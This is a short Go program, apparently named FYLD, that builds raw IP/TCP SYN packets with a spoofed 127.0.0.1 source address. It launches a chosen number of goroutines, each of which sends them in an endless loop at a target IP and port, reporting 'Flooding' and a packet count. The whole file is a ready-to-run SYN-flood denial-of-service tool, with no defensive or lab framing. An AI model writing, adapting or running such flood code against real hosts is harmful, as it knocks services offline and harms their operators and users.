package main

import (
	"flag"
	"fmt"
	"net"
	"sync/atomic"
	"syscall"
	"time"
)

var (
	totalPackets int64
	targetIp     string
	targetPort   int64
	workerCount  int64
	noCounter	 bool
)

func worker(ipStr string, port int64) {
	fd, err := syscall.Socket(syscall.AF_INET, syscall.SOCK_RAW, syscall.IPPROTO_RAW)
	if err != nil {
		fmt.Println("Failed to initiate socket. worker stopped.", err)
		workerCount--
		return
	}
	defer syscall.Close(fd)
	err = syscall.SetsockoptInt(fd, syscall.IPPROTO_IP, syscall.IP_HDRINCL, 1)
	if err != nil {
		fmt.Println("Failed to configure socket!. worker stopped.", err)
		workerCount--
		return
	}
	destIP := net.ParseIP(ipStr).To4()
	if destIP == nil {
		fmt.Println("Failed to fetch destination IP. worker stopped.", err)
		workerCount--
		return
	}
	addr := syscall.SockaddrInet4{
		Port: int(port),
		Addr: [4]byte{destIP[0], destIP[1], destIP[2], destIP[3]},
	}
	packet := []byte{
		0x45,
		0x00,
		0x00, 0x28,
		0xab, 0xcd,
		0x40, 0x00,
		0x40,
		0x06,
		0x00, 0x00,
		127, 0, 0, 1,
		destIP[0], destIP[1], destIP[2], destIP[3],
		0x30, 0x39,
		byte(port >> 8), byte(port & 0xff),
		0x00, 0x00, 0x00, 0x01,
		0x00, 0x00, 0x00, 0x00,
		0x50,
		0x02,
		0x72, 0x10,
		0x00, 0x00,
		0x00, 0x00,
	}
	if !noCounter {
		for {
			err = syscall.Sendto(fd, packet, 0, &addr)
			if err != nil {
				fmt.Println("Failed to send packet. worker stopped.", err)
				workerCount--
				return
			}
			atomic.AddInt64(&totalPackets, 1)
		}
	} else {
		for {
			err = syscall.Sendto(fd, packet, 0, &addr)
			if err != nil {
				fmt.Println("Failed to send packet. worker stopped.", err)
				return
			}
		}
	}
}

func main() {
	flag.Usage = func() {
		fmt.Println("Invalid input or missing args.")
		fmt.Println("Usage: FYLD -ip <ip> -port <port> -workers <workers>")
	}
	targetIpPtr := flag.String("ip", "", "Enter the target ip")
	targetPortPtr := flag.Int64("port", 0, "Enter the target port")
	workerCountPtr := flag.Int64("workers", 0, "Enter the number of workers")
	noCounterPtr := flag.Bool("no-packet-counter", false, "Enable to stop counting packets sent (might improve performance)")
	flag.Parse()
	if *targetIpPtr == "" || *targetPortPtr == 0 || *workerCountPtr == 0 {
		fmt.Println("Invalid input or missing args.\nUsage: FYLD -ip <ip> -port <port> -workers <workers> -")
		return
	}
	targetIp = *targetIpPtr
	targetPort = *targetPortPtr
	workerCount = *workerCountPtr
	noCounter = *noCounterPtr
	fmt.Print("\033[H\033[2J\n\n")
	fmt.Printf("Initiating workers...\nPlease wait...\n")
	for i := 0; int64(i) < workerCount; i++ {
		go worker(targetIp, targetPort)
	}
	fmt.Print("\033[H\033[2J\n\n")
	fmt.Printf("Flooding %s at port %d using TCP with %d workers\n", targetIp, targetPort, workerCount)
	fmt.Printf("------------------------------------------------------\n")
	if !noCounter {
		for {
			if workerCount == 0 {
				fmt.Printf("\nAll workers are stopped.\n")
				return
			}
				fmt.Printf("\rTotal packets sent: %-20d", totalPackets)
			time.Sleep(time.Millisecond * 500)
		}
	}
}